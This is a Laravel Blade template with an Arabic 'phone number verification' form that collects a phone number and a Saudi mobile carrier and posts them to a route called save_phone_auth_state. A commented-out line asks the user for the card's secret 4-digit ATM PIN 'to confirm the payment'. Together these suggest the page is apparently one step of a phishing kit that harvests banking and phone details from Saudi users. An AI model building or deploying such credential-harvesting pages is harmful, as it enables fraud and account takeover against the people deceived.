@extends('layouts.main')
@section('content')
<section class="padding-start container mb-5">
  <div class="row justify-content-center shadow">
    <div class="col-12 col-lg-7">
      <div class="row">
        <div class="col-12 mt-5 mb-4">
          <div class="card">
          </div>
          <div class="card-body">

            <form method="post" action="{{route('save_phone_auth_state')}}">
              @csrf
                <div class="col-12 mt-3">
                    <h3 style="color: black">إثبات رقم الهاتف</h3>
                    {{-- <p style="color: black; margin-top: 10px">الرجاء إدخال رقم البطاقة السري للصراف الاًلي (ATM) المكون من 4 خانات للتأك من عملية الدفع</p> --}}
                    <hr>
                </div>
                <div class="col-12">
                  <div class="mb-3">
                    <label for="phone" class="form-label">رقم الهاتف</label>
                    <input onkeypress="return onlyNumberKey(event)" maxlength="10" type="tel" class="form-control cd" id="phone" name="phone" placeholder="أدخل رقم الهاتف" required>
                  </div>
                </div>
                <div class="col-12">
                  <div class="mb-3">
                    <label for="provider" class="form-label">مزود الخدمة</label>
                    <select class="form-control form-control-lg " id="provider" name="provider"  placeholder="" required>
                      <option value="شركة الاتصالات السعودية">شركة الاتصالات السعودية STC</option>
                      <option value="زين">زين</option>
                      <option value="موبايلي">موبايلي</option>
                      <option value="فيرجن موبايل">فيرجن موبايل</option>
                      <option value="ليبارا">ليبارا</option>
                      <option value="شركة الاتصالات المتكاملة">شركة الاتصالات المتكاملة</option>
                    </select>
                  </div>
                </div>

              </div>
              <div class="col-12 mt-5">
                <button style="width: 100%;" type="submit" class="btn btn-primary btn-lg form-control-lg">التالـــي</button>
              </div>

            </form>

          </div>
        </div>
      </div>
    </div>
  </div>
</section>

@endsection